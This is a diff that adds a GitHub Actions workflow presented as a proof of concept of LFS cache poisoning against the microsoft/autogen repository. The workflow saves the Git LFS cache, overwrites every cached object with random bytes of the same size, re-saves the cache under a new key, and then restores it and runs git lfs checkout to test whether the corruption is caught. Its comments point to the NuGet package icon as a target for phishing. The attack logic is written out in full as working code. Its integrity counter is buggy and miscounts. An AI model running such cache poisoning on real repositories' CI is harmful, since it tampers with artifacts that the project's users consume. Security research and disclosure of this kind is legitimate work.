@@ -1,0 +1,174 @@
+name: LFS Cache Poison PoC - AutoGen
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  baseline:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          lfs: true
+
+      - name: Record baseline image hashes
+        run: |
+          mkdir -p evidence
+          echo "=== BASELINE: LFS image integrity ==="
+          echo "Autogen tracks *.png/*.jpg/*.jpeg via LFS"
+          echo ""
+          echo "LFS files:"
+          git lfs ls-files | head -20
+          echo ""
+          echo "=== Baseline SHA-256 hashes of key images ==="
+          for img in $(find . -name '*.png' -o -name '*.jpg' -o -name '*.jpeg' | head -5); do
+            SHA=$(sha256sum "$img" 2>/dev/null | awk '{print $1}')
+            echo "  $img: $SHA"
+            echo "$img $SHA" >> evidence/baseline-hashes.txt
+          done
+          echo ""
+          echo "=== LFS cache manifest ==="
+          find .git/lfs/objects -type f | sort > evidence/lfs-cache-baseline.txt 2>/dev/null || true
+          cat evidence/lfs-cache-baseline.txt | head -20
+
+      - name: Save LFS cache
+        uses: actions/cache/save@v4
+        with:
+          path: .git/lfs
+          key: autogen-lfs-poison-${{ github.run_id }}-baseline
+
+      - name: Upload baseline evidence
+        uses: actions/upload-artifact@v4
+        with:
+          name: baseline-${{ github.run_id }}
+          path: evidence/
+          retention-days: 90
+
+  poison:
+    needs: baseline
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          lfs: false
+
+      - name: Restore LFS cache from baseline
+        uses: actions/cache/restore@v4
+        with:
+          path: .git/lfs
+          key: autogen-lfs-poison-${{ github.run_id }}-baseline
+
+      - name: Poison LFS cache objects (same size, different sha256)
+        run: |
+          mkdir -p evidence
+          echo "=== POISONING LFS CACHE ==="
+          echo "Autogen's LFS images are used in docs, tests, and NuGet package icon."
+          echo "A poisoned image could inject malicious content into documentation"
+          echo "or replace the NuGet package icon with a phishing image."
+          echo ""
+          COUNT=0
+          find .git/lfs/objects -type f 2>/dev/null | sort | while read obj; do
+            ORIGINAL_SIZE=$(stat -c%s "$obj")
+            ORIGINAL_SHA=$(sha256sum "$obj" | awk '{print $1}')
+            dd if=/dev/urandom of="$obj" bs=1 count="$ORIGINAL_SIZE" 2>/dev/null
+            POISON_SHA=$(sha256sum "$obj" | awk '{print $1}')
+            echo "$obj original=$ORIGINAL_SHA poison=$POISON_SHA size=$ORIGINAL_SIZE" >> evidence/poison-manifest.txt
+            COUNT=$((COUNT+1))
+          done
+          echo "Poisoned $(wc -l < evidence/poison-manifest.txt 2>/dev/null || echo 0) LFS objects"
+          echo "poison_timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> evidence/poison-manifest.txt
+
+      - name: Save poisoned LFS cache
+        uses: actions/cache/save@v4
+        with:
+          path: .git/lfs
+          key: autogen-lfs-poison-${{ github.run_id }}-poison
+
+      - name: Upload poison evidence
+        uses: actions/upload-artifact@v4
+        with:
+          name: poison-${{ github.run_id }}
+          path: evidence/
+          retention-days: 90
+
+  attack:
+    needs: poison
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          lfs: false
+
+      - name: Restore poisoned LFS cache
+        uses: actions/cache/restore@v4
+        with:
+          path: .git/lfs
+          key: autogen-lfs-poison-${{ github.run_id }}-poison
+
+      - name: Run git lfs checkout (consume poisoned cache)
+        continue-on-error: true
+        run: |
+          mkdir -p evidence
+          git lfs install --local 2>&1 | tee evidence/lfs-install.txt
+          git lfs fetch origin 2>&1 | tee evidence/lfs-fetch.txt || true
+          git lfs checkout 2>&1 | tee evidence/lfs-checkout.txt
+          echo "lfs_checkout_rc=$?" >> evidence/lfs-checkout-rc.txt
+
+      - name: V2 - Integrity guarantee check on autogen images
+        run: |
+          mkdir -p evidence
+          echo "=== V2: Integrity Guarantee Test on microsoft/autogen LFS images ==="
+          MISMATCH_COUNT=0
+          TOTAL=0
+          git lfs ls-files 2>/dev/null | while read oid_star path; do
+            TOTAL=$((TOTAL+1))
+            if [ -f "$path" ]; then
+              ACTUAL=$(sha256sum "$path" 2>/dev/null | awk '{print $1}')
+              CLEAN_OID=$(echo "$oid_star" | tr -d '*')
+              if [ "$ACTUAL" != "$CLEAN_OID" ]; then
+                MISMATCH=$((MISMATCH_COUNT+1))
+                echo "MISMATCH: $path expected_oid=$CLEAN_OID actual_sha256=$ACTUAL" >> evidence/v2-integrity.json
+              fi
+            fi
+          done
+          echo ""
+          echo "Summary:"
+          echo "Total LFS files checked: $(cat evidence/v2-integrity.json 2>/dev/null | wc -l)"
+          cat evidence/v2-integrity.json 2>/dev/null | head -10
+          echo ""
+          LFS_RC=$(cat evidence/lfs-checkout-rc.txt 2>/dev/null || echo "unknown")
+          echo "git lfs checkout exit code: $LFS_RC"
+          echo "lfs_checkout_rc=$LFS_RC" >> evidence/v2-integrity.json
+
+      - name: V5 - Supply chain boundary check (NuGet icon)
+        run: |
+          mkdir -p evidence
+          echo "=== V5: Supply Chain Boundary Test ==="
+          echo "dotnet/nuget/icon.png is the NuGet package icon."
+          echo "If poisoned, it could be used in phishing attacks against package consumers."
+          ICON_SHA=$(sha256sum dotnet/nuget/icon.png 2>/dev/null | awk '{print $1}')
+          echo "nuget_icon_sha256=$ICON_SHA" >> evidence/v5-nuget-icon.json
+          cat evidence/v5-nuget-icon.json
+
+      - name: Collect LFS cache state
+        run: |
+          mkdir -p evidence
+          find .git/lfs -type f -exec sha256sum {} \; 2>/dev/null > evidence/lfs-cache-attack-sha256.txt || true
+
+      - name: Upload attack evidence
+        uses: actions/upload-artifact@v4
+        with:
+          name: attack-${{ github.run_id }}
+          path: evidence/
+          retention-days: 90
+
+      - name: Print verdict
+        run: |
+          echo "## LFS Cache Poisoning Verdict - microsoft/autogen" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          V2=$(cat evidence/v2-integrity.json 2>/dev/null | head -5)
+          echo "V2 Integrity: $V2" >> $GITHUB_STEP_SUMMARY
+          ICON=$(cat evidence/v5-nuget-icon.json 2>/dev/null)
+          echo "NuGet Icon: $ICON" >> $GITHUB_STEP_SUMMARY
